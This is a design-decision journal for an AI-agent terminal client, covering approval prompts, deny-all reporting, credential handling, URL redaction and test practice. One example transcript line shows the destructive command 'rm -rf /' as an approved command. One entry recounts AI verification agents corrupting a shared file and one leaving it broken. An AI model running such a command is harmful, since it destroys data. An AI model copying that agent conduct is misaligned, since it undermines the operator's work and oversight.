300 seconds is the gateway's own default (`_get_approval_timeout()`, `tools/approval.py:2648-2657`) and the gateway fails **closed** (`"Silence is not consent."` at `:2976`, recorded as `"outcome": "timeout"` at `:4050`). So the number and the failure direction are both cited rather than invented. But that timeout is **configurable**, so Talaria does not know the real deadline — which is why the sentence hedges ("probably stopped waiting") and never says *denied*, however likely a denial is. Saying "denied" would be inventing an acknowledgement that no reply carried.

**Rejected alternatives.** *Do nothing and let the card sit* — the shipped behaviour, and the one that disables the correlation rule for the next real approval. *Send a denial when the timer fires* — a client answering on its own initiative for a command the operator never read is the exact harm `DENY_ALL_CHOICE` is hard-wired against, and it would also be a second answer if the gateway had already timed out. *Grey the card out but keep it in the registry* — cosmetic; the projection would still count it, so the real defect survives. *Read the gateway's configured timeout* — no method publishes it; the terminal gateway has no `GET /v1/capabilities` equivalent. *Use a wall clock in replay* — would age out an entire recorded corpus on the first tick and break AE2's "replay it twice, get the same state".

**Revisit when.** The gateway emits an approval expiry or publishes its configured timeout — either makes the local guess unnecessary and lets the card say what actually happened. Also revisit if an operator reports a card disappearing while the gateway was still waiting, which would mean the deployment raised `HERMES_APPROVAL_TIMEOUT` above the default and the constant should become configurable rather than fixed.

## 2026-08-03 — Deny-all reports what it decided and what it cannot know as two clauses, not one total

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fourth adversarial round — amending the third round's own decision

**Decision.** `DenyAllScope` loses `total` and gains two properties. `denied` is `len(taken)` — approvals **this call** removed from the registry, which is exactly the set whose fate this call decides. `undecided` is `len(already_in_flight)` — approvals the gateway's `all` flag also reaches, but which have their own `approval.respond` on the wire. The transcript line names them separately:

> denied every waiting approval: 2 waiting (+1 already answered, outcome unknown), 3 resolved

**Rationale.** The third round replaced `len(taken)` with `len(taken) + len(already_in_flight)` because reporting the cards alone said "2 denied" while the gateway swept three. That correction was right about the omission and wrong about the claim. An `already_in_flight` approval may be carrying the affirmative the operator pressed a second earlier; which of the two responds the gateway applies is decided by arrival order there, which Talaria neither knows nor waits for. Calling it denied produced a transcript asserting two different fates for one command — `denied every waiting approval: 2 waiting` beside `approval answered: once · command: rm -rf /`.

The split also bounds repetition, which the sum did not. Any approval arriving inside a deny-all round trip mounts a card whose only action is "deny all", so a second press is one keystroke away; the sum re-counted every approval the first press had claimed, reporting five denials for three approvals. `denied` counts only prompts this call removed, and a press that removes none is refused, so the denials claimed across a session can never exceed the approvals that arrived in it.

**Rejected alternatives.** *Refuse deny-all while any approval answer is in flight* — the other option, and it removes the safe escape at exactly the moment a second approval arrives mid-answer, which is when the operator most needs it. *Keep the sum and soften the headline* ("up to N denied") — a range still asserts the verb of both groups, and "up to" invites being read as the larger number. *Wait for the in-flight reply before sending the deny-all* — a denial delayed by a round trip that may itself time out, on the one action offered when nothing can be aimed. *Report only `denied` and say nothing about the rest* — the third round's original defect, restored.

**Revisit when.** `approval.request` carries a correlating identifier, at which point deny-all stops being the only aimable action and the in-flight ambiguity disappears with it. Also revisit if `approval.respond` starts reporting *which* entries it resolved rather than only how many — that would let the line name outcomes instead of counts.

**Known consequence of the rejected alternative, recorded beside the decision.** Declining to refuse deny-all while an answer is in flight has a second-order effect on the *screen*, not only on the count. `all: true` resolves the whole queue including the in-flight entry; that entry's own call can then come back `not_sent`, take the restore branch, and put its card back — re-offering a control for an approval the gateway denied a moment earlier. Read from two code paths and **not reproduced**, so it is carried as PLAUSIBLE. It is tracked in `QUEUED.md` under "A deny-all that succeeds can re-offer a control the gateway already resolved"; it is recorded here because it is a cost of this decision rather than a free-standing defect, and anyone revisiting the decision needs to see it attached to the choice that produced it.

## 2026-08-03 — Prettier is scoped to the TypeScript bootstrap; docs are excluded

**Author.** v0.1 segment 1, unblocking the `check` CI job

**Decision.** `.prettierignore` now excludes `docs/`, `.venv`, and `__pycache__`. Prettier governs the superseded TypeScript bootstrap under `src/` and nothing else; ruff owns formatting for the Python tree, and the `docs/` tree is formatted by hand. The exemption is scoped to `docs/`: the root markdown files — `README.md`, `AGENTS.md`, `CLAUDE.md` — stay Prettier-governed, so the repository's front door keeps a mechanical formatting check.

**Rationale.** Prettier is here on a lease. It arrived with the TypeScript bootstrap and leaves with it (ADR-0004), so scoping it to the tree it was chosen for is the load-bearing argument: a formatter for a superseded language should not be the authority on Python-era documentation it was never configured to understand. The `check` job's `prettier --check .` step had been failing on `main` since `064967b` — not on TypeScript, which typechecks clean and passes all 45 vitest tests, but on ten markdown and JSON files under `docs/`.

A second, narrower reason applies to exactly one of those ten files. `docs/plans/2026-08-02-talaria-v0-1-prototype-plan.md` is byte-pinned by the doc-review artifact's `target_sha256_after: 010ff5f6…`; running `prettier --write` would rewrite it and invalidate the hash that proves the review gate was satisfied. That is a real hazard, but it is one file, not a general property of `docs/` — the other pinned target on record, the requirements brainstorm, formats clean and was never in the failing set. The scoping decision would stand on the tool-lifecycle argument alone.

**Rejected alternatives.** `prettier --write .` (invalidates the pinned plan hash described above, and would keep doing so every time that plan is regenerated). Deleting the `check` job (it still carries real signal — typecheck plus 45 tests — until `src/` is removed). Per-file ignore entries (every new document under `docs/` would fail CI until someone remembered to add it, which is how this failure accumulated in the first place).

**Revisit when.** The superseded `src/` tree is removed, at which point Prettier and the entire `check` job leave the repository with it. Also revisit if documentation formatting ever needs to be mechanically enforced — that would call for a markdown-aware linter chosen for the Python era, configured to leave pinned artifacts alone.

## 2026-08-02 — The domain view model is an immutable snapshot plus a set of change markers

**Author.** v0.1 unit U3

**Decision.** Every projection emission is a frozen dataclass (`talaria.domain.projection.Snapshot`) carrying the transcript view, the sub-agent view, the prompt view, and the KTD5 status payload, plus `changed: frozenset[str]` naming which of those four regions differs from the previous emission. The UI skips untouched regions without the domain knowing what a widget is.

**Why U3 decided this and not U5.** ADR-0002 left the view-model shape open and assigned it to "the first vertical slice's re-render-cost evidence", which the plan pointed at U5. But U3 has to ship `projection.py`, the status payload, the terminal-read views, and the UI view models *before* U5 exists, so as ordered the question could not be answered where it was asked. U3 chooses; U5 measures and records the number.

**Rationale.** AE2 requires that replaying one corpus twice produces an identical projection. Comparing two values is trivial; comparing two mutation histories is not. In-place mutation would have made the determinism requirement awkward to test at exactly the point where it matters most.

**Rejected alternatives.** In-place mutation with dirty flags (cheaper per frame, but AE2's comparison becomes a bespoke differ nobody trusts). Emitting a diff instead of a snapshot (smaller payloads, but the UI then has to reconstruct state, which puts a second copy of the domain in the presentation layer — the thing ADR-0002 exists to prevent).

**Cost.** One allocation per emission. That is precisely what U5 is asked to measure against KTD14's thresholds; if the measurement is bad, the ADR records it with the evidence rather than U3 having guessed silently.

**Revisit when.** U5's gate publishes its re-render cost and memory growth curve.

## 2026-08-02 — Cancelled is a sticky turn state, and sub-agent rows outlive their turn

**Author.** v0.1 unit U3, from the reconciliation-catalogue read

**Decision.** Two deliberate divergences from Hermes, both recorded in the catalogue with named tests.

`turn == "cancelled"` survives until the next `message.start`. Hermes's `interrupted` latch does the same thing internally (`ui-tui/src/app/turnController.ts:989` is the only site that clears it), but it settles the *displayed* status to `ready` immediately. R4 requires the transcript to show that a turn was cancelled rather than that it ended, and KTD5's status enum already has a `cancelled` member — so a status payload sampled after a cancelled turn reports `cancelled`, not `idle`.

Sub-agent rows are cleared by the next `message.start` rather than at turn end. Hermes drops them at `idle()` and archives the fan-out to disk via `spawn_tree.save`. Talaria has no archive to move them into, because R17 forbids authoring sub-agent state and `spawn_tree.save` is the concrete method that rule excludes.

**Rationale.** The second decision is what makes AE14 testable rather than vacuous. AE14 asks that a terminal sub-agent row survive a late progress event; if rows vanish at turn end, the late event has no row to fail to overwrite and the guard is never exercised.

**Rejected alternatives.** Clearing rows at turn end and testing the guard only mid-turn (matches Hermes, but leaves the AE14 sequence untested where it actually occurs — after `message.complete`). Building a Talaria-side spawn archive (violates R17, and R17 exists because a read-only client is the whole standalone-client boundary in ADR-0001).

**Cost.** One turn's fan-out is retained after the turn ends. Queued at P2 alongside the reasoning-buffer decision, with the U5 growth curve as the input.

**Revisit when.** U5's memory growth curve makes domain-side eviction a requirement, or a live session shows a fan-out large enough for the one-turn retention to matter.

## 2026-08-03 — Textual passed its gate; the presentation layer is settled and ADR-0005 is accepted

**Author.** v0.1 unit U5 — the replay-driven Textual shell and framework validation gate

**Decision.** Textual 8.2.8 is Talaria's presentation layer for v0.1, recorded as [ADR-0005](../../platform-specs/04-architecture/adrs/0005-textual-is-talarias-presentation-layer.md), `accepted` by the operator on 2026-08-03. The gate ran three times that day — `pass` on a gate that was measuring itself, `fail` on the repaired gate, and `pass` on the repaired gate once the three defects it found were fixed. Acceptance rests on the third run and its thirteen checks; measurements and the full sequence are in [Textual validation gate results](../analysis/2026-08-03-textual-validation-gate-results.md).

**The gate is a shipped command, not a one-off script.** `uv run talaria gate --corpus <recording> --deltas 50000` replays both corpora through the real `TalariaApp`, compares every measurement against KTD14's thresholds, prints the whole record as JSON, and exits non-zero on a fail verdict. Re-establishing the verdict after a Textual upgrade is therefore one command rather than an archaeology exercise.

**Rationale.** The plan's central bet was that the prototype and the gate are the same build, because a gate that measures a purpose-built harness proves the harness. That held: every number came from the app the operator runs.

**Two passes, not one, and the reason is a correction.** The first version of the gate measured only an unbounded replay, and reported 1 render tick — because the domain reducer drains 53,516 frames in 2.3 seconds, long before a 50ms coalescing tick can fire more than a handful of times. That is a real result about the reducer and a meaningless one about the renderer, and reporting it alone would have claimed a renderer verdict on reducer evidence. The gate now also replays on the corpus's recorded cadence, scaled to a 60-second window, where the render loop runs 2,907 times against a live stream.

**Answers to two questions earlier ADRs deferred.** ADR-0002 asked for the re-render cost of U3's immutable-snapshot view model: it is not the bottleneck, because one snapshot is allocated per flush rather than per frame. ADR-0004 warned that transcript virtualization would have to be owned explicitly: true, and it cost about 120 lines, holding 501 mounted widgets across a corpus that produced 4,454 lines. It also turned out to be where all three gate failures lived, which is the honest version of "cheap".

**Rejected alternatives.** Switching to `prompt_toolkit` anyway (trades a measured framework for an assessed one). Deferring the framework decision further (the deferral existed to buy evidence; the evidence exists).

**Cost.** A `textual>=8.2.8,<9` pin, and a namespace shared with a large private framework surface — see the LEARNINGS entry on `_closing`.

**Revisit when.** The Textual pin is widened, a real terminal host exercises what the headless gate could not, or the recorded steady-state memory slope of 0.23 MB per 1,000 frames starts to matter in a real session. That slope rose from 0.11 when the reconciliation defect was fixed, because the pane now does work it had been skipping — see the LEARNINGS entry on defects that suppress the cost of the work they suppress.

## 2026-08-03 — The projection publishes its committed boundary; a bounded window tracks a position, not a tally

**Author.** v0.1 milestone-1, closing the U5 gate failure

**Decision.** Two rules for any renderer that diffs against `TranscriptView`.

1. **The domain names the settled region; the renderer never infers it.** `TranscriptView.committed_lines` is the index where the provisional streaming block begins. A renderer may skip re-examining lines below it and must re-examine everything above it, every tick. Inferring "settled" from two snapshots agreeing on a line is invalid, because the provisional block sits *after* the committed lines and moves down whenever an entry commits mid-stream.
2. **A bounded window stores where it starts, not how much it has evicted.** `TranscriptPane._top` is an absolute index. `condensed_count` is derived from it, so mounted-plus-condensed equals the transcript length by construction, and the number can fall when the window is re-derived further up.

**Rejected alternatives.** *Reconciling the full window each tick* — correct, and O(transcript) per 50ms tick, which is the cost KTD14 exists to bound. *Making notice lines non-transient* — proposed in the defect report and does nothing, because the notice lines were never transient; the streaming block is what moves. *Placing the provisional block before the committed lines* so the projection is append-only — contradicts KTD10, which requires a mid-stream `read_terminal` to describe the screen the operator is actually looking at.

**Rationale.** The renderer cannot compute the boundary from the data it receives, and every attempt to guess it is a guess about immutability — exactly the class of assumption that should be stated by the party that owns it. The cost is one integer per snapshot. Adding it to a frozen dataclass in the domain does not import a framework, so ADR-0002 is untouched.

**Cost.** `TranscriptView` gains a field that every hand-built view in a test must now either pass or default. The default is `0` — "assume nothing is settled" — so omitting it makes a consumer do more work rather than skip work it should have done.

**Revisit when.** The transcript grows a second provisional region (an editable draft in the scroll-back, say). Then one integer stops being enough and the projection should publish spans rather than a boundary.

## 2026-08-03 — The gate's corpora are cited by digest, and the stress corpus is generated rather than committed

**Author.** v0.1 unit U5

**Decision.** Neither gate corpus enters version control (R29). The recorded session is cited by opaque label, sha256 and frame count. The 53,516-frame stress corpus is *generated* from a seed by `talaria.replay.stress.build_stress_corpus`, and the results doc records the seed and the digest rather than shipping the file.

**Rationale.** A checked-in corpus is a provenance claim nothing verifies — it is whatever was committed, and a later edit is invisible. A seed plus a digest is checkable in one command: regenerate, compare. It is also the only form of provenance compatible with a public repository whose corpora may carry session content the redaction deny-set missed.

**Why the stress corpus is synthetic at all.** The recorded session proves the interface handles *actual* traffic (R30). It cannot carry the thresholds, because its size is whatever the session happened to be, and a threshold measured against an accidental number is not a threshold. The two corpora answer different questions and the results doc keeps them separate.

**Rejected alternatives.** Committing a small real corpus (R29 forbids it, and small defeats the purpose). Generating without a seed (reproducibility is the whole claim). Citing a local path (the public-context rule forbids it, and a path is not evidence anyway).

**Cost.** Anyone reproducing the gate must either supply their own recording or accept that the recorded-session half is skipped. The command degrades honestly: without `--corpus` it runs the stress passes and omits the recorded-session checks rather than pretending.

**Revisit when.** A corpus is needed by a consumer that cannot run the generator — for example a cross-language comparison that has no Python.

## 2026-08-03

### Redact URL credentials by position, and do not redact URL paths at all

**Author.** v0.1 milestone-1 integration, after external review of the redaction boundary

**Decision.** The recorder withholds credentials from the two URL positions that are *defined* to hold them — userinfo and named query parameters — and withholds nothing from a URL's path, even when the path is known to carry a bearer capability.

**Rejected alternatives.** A Hermes-shaped rule for `/devtools/browser/<segment>` was rejected as worse than doing nothing: it protects exactly one known shape while creating the appearance that paths are handled, so the next capability-bearing path leaks silently against a reader's belief that it cannot. That is the identical staleness failure the method deny-set was already bitten by, and the reason the key-name net exists behind it. A "high-entropy path segment" heuristic was rejected because it redacts the commit SHAs, content hashes and UUID resource ids the corpus exists to study — over-redaction is a different failure, not the safe direction, which is the same principle that keeps the sixteen non-credential `token` key names out of the net.

**Rationale.** Userinfo and query parameters have credential semantics independent of any application: `user:password@host` is a credential by RFC, and a query key named `token` or `ticket` is one by the gateway's own protocol. A path segment has no such semantics — it is a capability only because some specific service decided it was, which means any rule covering it is a bet on one service's URL shape. Redaction rules that encode a bet age badly and hide their own staleness.

**Cost, stated plainly.** A capability-bearing path is recorded verbatim. This is *not* mitigated by loopback: loopback is the default CDP host, not a constraint, and Hermes documents `BROWSER_CDP_URL` to operators as accepting any Chromium-family browser, so remote CDP is an ordinary configuration today. The residual exposure needs an operator who has configured a remote endpoint *and* a corpus that leaves the machine.

**The candidate fix, and what blocks it.** Withholding the path of non-loopback `ws`/`wss` URLs carries no service-specific shape and costs nothing on study data, since SHAs and resource ids live in `http`/`https` document URLs. It is blocked on *sequencing*, not on harness cost: the comparator would have to encode an expectation about a redactor rule the remote-attach work has not yet defined. The comparator change itself is around ten lines mirroring the existing query-key allowance — an earlier version of this entry priced it as a change to the parity relation, which overstated it and would have caused whoever picked it up to defer it again.

**Revisit when.** Remote gateway attach is implemented (the natural place to extend the comparator), or a non-loopback host is observed in a recorded URL. Both triggers and the mechanical check are in `QUEUED.md`. The trigger this entry originally carried — "remote CDP becomes supported" — was wrong: it had already happened, so it could never fire.

## 2026-08-03

### Tests over real subprocesses assert invariants, not schedules

**Author.** v0.1 milestone-1 integration, from external review; written before segment 3 rather than after its first flake

**Decision.** A test that spawns a real process, or shares a resource with a background loop, asserts a load-independent invariant. Where it needs a specific outcome, it *drives* the precondition rather than hoping the scheduler supplies it.

**The evidence this is a family, not an incident.** Three in this suite already, all with the same mechanism — an unstated timing assumption that holds on an idle machine and dissolves under CI load, where the window is usually exactly the cost of a process spawn:

- `test_the_status_command_runs_and_renders_under_replay` asserted `outcome == "ok"` on a tick fired while the app's own status loop (`talaria/ui/app.py:154`, which ticks before its first sleep) still had one in flight. The KTD5 guard correctly returned `overlapped_skip`. The guard was working; the test assumed it was the only caller.
- An overlap test configured a 0.3s timeout against a child that slept 0.2s, leaving 0.1s for a Python interpreter to start.
- `test_overlap_at_most_one_child_ever` reported zero successful invocations of three on a CI leg. Still unexplained, deliberately not folded into the first item's fix — a fix that explains one member of a family and absorbs the other closes an open defect on a resemblance.

**The two rules.**

1. *Assert the invariant, not the schedule.* "At most one child ever ran" is load-independent. "This particular attempt returned `ok`" is a bet on scheduling. Both were available in the status case and only one of them is a test.
2. *A test sharing a resource with a background loop must stop the loop or account for it.* Accounting can be a bounded retry, but the comment must say which background actor it is racing, or the next reader will read the retry as superstition.

**Rejected alternative.** Reruns, retry plugins, or marking the tests flaky. That treats an unstated precondition as noise, and it hides exactly the class of defect where the production code has a real race — the reason the still-unexplained third instance is kept open rather than retried away.

**Why now.** Segment 3 (U7 transport, U8 remote attach, U10 acceptance against a launched gateway) adds a live socket, reconnect timers, and PTY-driven credential prompts: the highest concentration of background actors and real process spawns in the plan. The cost of this convention is a comment and a driven precondition; the cost of discovering it there is a CI flake that reads as a transport bug.

**Revisit when.** A fourth instance appears despite the rule, which would mean the rule is being read as advice rather than as a precondition to state, or a test genuinely needs to assert a timing property — in which case it should measure a distribution, not a single attempt.

## 2026-08-03

### The credential is a per-dial provider, and the correlation key carries a connection epoch

**Author.** v0.1 milestone-2, unit U7 (live transport)

**Decision.** Two shapes in the live transport are fixed here, and neither is negotiable by a later unit without a new entry.

1. **Credentials are acquired through `CredentialProvider.acquire()`, called on every dial including every reconnect.** v0.1 ships `LoopbackTokenProvider` only. The environment and the credential file are re-read per call, so a rotated token is picked up by the next reconnect; a credential that came from the interactive prompt is held in memory and never re-prompted.
2. **In-flight RPCs are keyed by `(connection epoch, request id)`, and request ids restart at 1 on every epoch.** A reply read from a connection that is no longer current is counted and discarded. Every call interrupted by a disconnect resolves to `unknown` — never to an error and never to a success.

**Rejected alternatives.** Fetching a token once at startup is correct for the loopback `?token=` form and only for it, and it makes the reconnect path silently depend on the credential being a fixed string — adding gated `?ticket=` support later would then mean rewriting reconnect, which is the most concurrency-sensitive code in the client. Keying replies by request id alone is correct until a reconnect races a late reply, at which point it converts an honest `unknown` into a reported success; that is the one failure R35 names explicitly. A globally monotonic id counter would make the epoch key look correct while making its guard permanently unreachable (see LEARNINGS).

**Rationale.** Both decisions cost one small object each and buy the property that the *shape* of the code does not change when the deferred work lands. The provider is one interface and one class; the epoch is one integer and a tuple key.

**Cost, stated plainly.** Two counters and a per-dial round trip that, for the loopback provider, reads one environment variable and possibly stats one file. Nothing measurable.

**Revisit when.** Remote or gated attach lands (`GatedTicketProvider` is specified in QUEUED.md), or the client ever needs more than one connection open at a time — at which point "the current epoch" stops being a single value and the discard rule needs restating.

### The transport publishes connection state by callback, and `connect_failed` is a cause, not a state

**Author.** v0.1 milestone-2, unit U7 (live transport)

**Decision.** `LiveSource` reports connection lifecycle through an `on_connection(state, detail)` callback rather than by injecting synthetic frames into the frame stream. R35's four conditions map onto KTD5's five frozen states as: authentication failure → `auth_failed`; initial connection failure → `disconnected` with `failure_kind == "connect_failed"` and no epoch ever opened; disconnect → `disconnected` after an epoch was opened; reconnect → `reconnecting`. The cause travels beside the state as a `detail` string. `auth_failed` survives `close()`.

**Rejected alternatives.** Emitting a synthetic `gateway.disconnected` event would carry the state into domain state through the existing reducer with no new plumbing — and would put a frame in the recorded corpus that no gateway ever sent, poisoning the one artifact whose entire value is that it is a faithful record. Adding a sixth `connect_failed` member to `ConnectionStatus` would be a `version: 2` change to the status contract KTD5 froze at the first commit, for a distinction that an accompanying string carries adequately.

**Rationale.** The seam between transport and domain is narrow on purpose (KTD3); a second channel for a second kind of information is cheaper than widening the first one, and it keeps "what arrived on the wire" and "what the transport is doing" separable in the corpus.

**Cost, stated plainly.** The transport re-declares `LiveConnectionState` rather than importing `ConnectionStatus` (ADR-0002 keeps the domain out of the transport's imports), so two spellings of one enum exist. `tests/transport/test_reconnect.py::test_the_transport_and_domain_connection_enums_are_identical` is the price, paid once.

**Revisit when.** A third consumer needs transport state and the callback starts growing parameters, or the status contract moves to `version: 2` for an unrelated reason — the natural moment to fold `connect_failed` in properly.

### The credential file is TOML, and looser-than-0600 is refused before it is read

**Author.** v0.1 milestone-2, unit U7 (live transport)

**Decision.** `<config_dir>/credentials` is a TOML document with a `token` key and an optional `url` key. Any file whose mode has a group or other bit set is refused with an error naming the mode and the `chmod` that fixes it; the check runs before the file is opened. Owner-execute (`0700`) is not refused — it exposes the file to nobody the way `0640` does.

**Rejected alternatives.** A bare single-line token file is what an operator would produce with `echo`, and it is genuinely more convenient — but it cannot carry the endpoint, and supporting both formats means guessing which one a file is, which is exactly the ambiguity a credential path should not have. Reading the file first and checking permissions afterwards produces a friendlier error and defeats the check: a file the whole machine can read has already leaked, and opening it anyway is the one action that makes the leak useful.

**Rationale.** KTD15 already establishes TOML as this repository's configuration language and `talaria/config.py` as the only reader of `config.toml`; using a second format for the file next to it would be a decision with no argument behind it. Whitespace is stripped from the value because `echo "$TOKEN"` appends a newline, and the gateway's constant-time comparison rejects it with no useful message.

**Cost, stated plainly.** An operator who writes the file by hand must type `token = "..."` rather than the bare value, and the error for a malformed file says so explicitly.

**Revisit when.** A second credential form needs storing (a refresh token for the deferred RFC 8252 native-app flow), which the TOML shape already accommodates — or an OS keychain becomes the primary store, at which point this file becomes a fallback and its format matters less.

### An agent that deliberately breaks code works in a disposable clone, never in the shared checkout

**Author.** v0.1 milestone-2, unit U7 (live transport) — raised by the milestone-1 review agent after a misattribution

**Decision.** Any agent whose method is deliberate breakage — mutation testing, "prove this test can fail", injected-failure verification — extracts its own copy with `git archive <ref> | tar -x -C <scratch>` and works there. It does not mutate files in the operator's working tree, even transiently, and it does not create scratch test files under `tests/`. **The rule is carried in the agent's prompt, not only here.** A subagent never reads this file; its entire world is the text it was spawned with, so a standard recorded only in the journal reaches the humans and the parent and no one who has to follow it. Treat the prompt as a configuration surface: anything an agent must do belongs in the prompt text verbatim, and the omission recurs once per agent that is not told.

**Rejected alternatives.** Coordinating between adversaries with a snapshot protocol — announce, mutate, restore, announce — does not work, because **snapshot-and-restore is only sound for a single writer.** Agent A snapshots, Agent B mutates the same file, A restores from its snapshot and writes back a baseline that already contains B's edit — or erases it. Both agents `diff` against their own snapshot, both report a clean restore, and the file is still wrong. That is not a hypothetical; it is the state this incident produced. Serializing adversarial agents so only one mutates at a time is sound, but it buys correctness by deleting the parallelism the verification panel exists for. Doing nothing and relying on each agent to restore what it broke is what we did; it held for each agent's own mutations and did not survive a second writer.

**Rationale.** Two U7 verification agents mutated `talaria/transport/rpc.py` concurrently. One saw the other's breakage, assumed a closed world of itself plus the one agent it knew about, attributed the damage to the milestone-1 reviewer, and deliberately left the file broken so as not to disturb what it believed was that agent's in-flight experiment. The reviewer had never written to the tree at all and proved it: `rpc.py` does not exist on the branch it reviewed. So a real defect — the epoch guard deleted from the one function whose job is to never confirm an unconfirmed call — sat in the checkout preserved by an act of care aimed at the wrong thing. A guard protecting a false premise reads as diligence and costs more than no guard, because the next reader trusts it.

Two things generalize past the incident. First, **an agent's model of "who else is writing here" is whatever its prompt happened to mention, which is almost never the real set** — the reporting agent knew about neither the peer it blamed nor its own sibling. That is why the fix cannot be a coordination protocol between agents: they cannot enumerate each other. Second, **the danger is worst for exactly the files an adversary is most likely to be pointed at.** `rpc.py` was untracked, so there was no committed baseline and no `git restore`; the only recovery path was one agent's private scratch backup. This inverts the usual intuition — the safest file to break in a shared tree is a committed one, and the most dangerous is the in-progress uncommitted file the implementer is still writing, which is precisely the file under review. A disposable copy is not tidiness there; it is the only thing standing between an experiment and work git cannot recover.

**Cost, stated plainly.** About 200-500ms and a working tree's worth of disk per agent, and the agent's findings cite paths inside its clone, so line numbers must be translated back before they are actionable. Both are cheap against one contaminated verification round.

**Revisit when.** Verification agents stop mutating code to prove their point, or the harness gains first-class per-agent worktrees that make the extraction implicit rather than something each prompt has to ask for.

## 2026-08-03

### A prompt is cleared before its answer is sent, and only a *known-unsent* answer puts it back

**Author.** v0.1 milestone-2, unit U8 (blocking prompts)

**Decision.** `TalariaApp.respond_live` removes the prompt from the registry *before* the respond call goes out. If the call resolves to `not_sent` — the one outcome that is definite that nothing reached any socket — `restore_prompt` puts the control back. Every other unconfirmed outcome leaves it cleared and writes a marked transcript line.

**Rejected alternatives.** *Clearing only on a confirmed reply* leaves the control live for the whole call, so a second press sends a second answer to one blocking question — and for the two bridges where the answer is a credential, the second answer is a second password attempt the operator did not intend. *Restoring on any unconfirmed outcome* is the same failure reached more slowly: `connection_lost` and `no_reply` both mean the request went out and the answer did not come back, so the gateway may well have taken the first value, and re-offering invites a second. The distinction is not new here — it is the same three-valued reasoning U7 recorded for `submit_live`, and the two now share `delivery_of` and `DELIVERY_NOTES` rather than each deciding for itself.

**Rationale.** The registry is the only place that knows which request ids are live, so it is the only place the "at most one answer" property can be enforced. Clearing first makes the property structural rather than a matter of how fast the operator's second keypress arrives.

**Cost, stated plainly.** An answer whose call fails in any way other than "never sent" is a question the operator can no longer answer. The gateway's own bridge expires after 30 seconds and the tool returns empty (`tui_gateway/server.py:2958-2998`), so the turn recovers; what is lost is the operator's chance to try again inside that window. The transcript says so explicitly rather than leaving a control that silently does nothing.

**Revisit when.** A bridge appears whose respond is idempotent by construction — a resend of the same value being provably harmless would remove the argument for clearing first — or the gateway starts acknowledging a respond with the request id it resolved, which would let a retry be correlated instead of guessed at.

### A respond value reaches the transcript only if the gateway itself offered it

**Author.** v0.1 milestone-2, unit U8 (blocking prompts)

**Decision.** One rule covers all five bridges: an answer is written into the transcript only when it is a member of the `choices` list the gateway sent (`echoable_answer` in `talaria/ui/prompts.py`). Everything else — a sudo password, a secret, free-typed clarify text — produces a value-free marker saying the bridge was answered. A *confirmed* terminal-read writes nothing at all; unconfirmed ones still write, because those are things the operator has to be told.

**Rejected alternatives.** *Echoing clarify answers* is the obviously friendlier choice and it is why the recorder's deny-set carries `clarify.respond` → `params.answer` in the first place: the key name looks innocuous and "paste the token here" is an ordinary thing for an agent to ask. *Writing nothing for any bridge* is safe and destroys the audit trail that matters most — "did I allow that command" is the question an operator asks afterwards, and only the approval choice answers it. Keying the rule on *kind* rather than on the offered list would need five decisions where one suffices, and would get the multiple-choice clarify wrong in whichever direction it was written.

**Rationale.** A gateway-offered choice is closed, machine-authored, and cannot carry operator input; anything else can. That is the whole distinction, and stating it as one rule means a bridge added later inherits the safe side by default. The transcript is also a less obvious egress than the frame log: the terminal-read bridge serves it straight back to the agent, so a credential written into it leaves the machine through a door nobody was watching.

**Cost, stated plainly.** An operator who answers a clarify sees "clarify answered" rather than what they said. The agent has the answer and normally refers to it in its next message, so the conversation stays readable; the transcript is not a keystroke log.

**Revisit when.** A bridge appears whose free-text answer is provably non-sensitive, or the transcript gains a redaction layer of its own — at which point echoing becomes a rendering decision rather than an egress one.

### An approval with no offered choices offers deny, and nothing else

**Author.** v0.1 milestone-2, unit U8 (blocking prompts)

**Decision.** When `approval.request` arrives with no `choices`, the control offers exactly `("deny",)`.

**Rejected alternatives.** *Synthesizing the usual list* (`once`/`session`/`always`/`deny`) matches what the gateway fills in most of the time and is the client granting permission the gateway never offered — the one direction where guessing wrong approves something. *Rendering no control at all* leaves a blocking prompt with no way to answer it, which is the abandoned-overlay bug Hermes already fixed once for clarify (`flushAbandonedClarify`).

**Rationale.** The gateway fills `choices` only when `allow_permanent` is present in the payload (`tui_gateway/server.py:1663-1670`), so an approval carrying neither is reachable rather than hypothetical. Deny is the only option that is safe to offer unasked, and the shipping terminal UI already treats it that way — it sends `{choice: 'deny'}` on escape without the gateway having offered anything (`ui-tui/src/app/useInputHandlers.ts:182`).

**Cost, stated plainly.** An operator who wanted to allow such a command cannot, and must let the approval expire and re-run the action. Rare, and the failure is in the direction that does not execute anything.

**Revisit when.** The gateway starts guaranteeing a `choices` list on every `approval.request`, which would make the fallback dead code and worth deleting rather than widening.

### The prompt registry stores the session, so R9's correlation clause is enforced rather than implied

**Author.** v0.1 milestone-2, unit U8 (blocking prompts)

**Decision.** `PendingPrompt` carries `session_id`, and `respond_to_prompt` refuses when the caller's session does not match it. Passing `None` skips the check, which is what a caller with no session context genuinely means.

**Rejected alternatives.** *Relying on the reducer's cross-session filter* is most of the guarantee already — an event for an unfocused session never registers a prompt — but it covers registration, not answering, and a control that outlived a focus change is precisely the case R9 names. *Checking in the app* would make it one caller's discipline; the registry is the one place that knows what session each live id belongs to, which is the same argument that put the id check there.

**Rationale.** Cost is one field and one comparison. Without it the property holds by an ordering coincidence — `focus_session` happens to clear the prompt list — and a coincidence is not something a later change can be checked against.

**Cost, stated plainly.** One more field on a frozen dataclass, and a keyword argument on a function the domain suite calls without it.

**Revisit when.** v0.1's single-session assumption ends. A real session switcher makes "the focused session" a poorer key than "the session this control belongs to", and the check becomes the primary routing rule rather than a guard.

### A new prompt takes the caret only when the composer is empty

**Author.** v0.1 milestone-2, unit U8 (blocking prompts)

**Decision.** `PromptRegion.apply` focuses a newly mounted control only when the app says the composer holds no text; otherwise the activity line does the asking.

**Rejected alternatives.** *Always focusing* is what an overlay does and it drops the keystrokes already in flight when a prompt arrives mid-word. *Never focusing* makes the common case — an idle operator, a blocking question — cost an extra keystroke to reach the only control that matters.

**Rationale.** A blocking prompt has a real claim on attention, and the composer holding text is the one observable signal that the operator is mid-thought. R8 is satisfied either way by the activity line, so focus is free to optimise for the ordinary case.

**Cost, stated plainly.** The rule depends on composer contents, so an operator who leaves stale text in the composer never gets automatic focus. Visible and self-inflicted.

**Revisit when.** The composer gains draft persistence, at which point "holds text" stops meaning "is being typed into" and the signal needs replacing with a real recent-keystroke test.

### The approval card renders the command, wrapped and visibly capped, and the transcript keeps it unclipped

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding

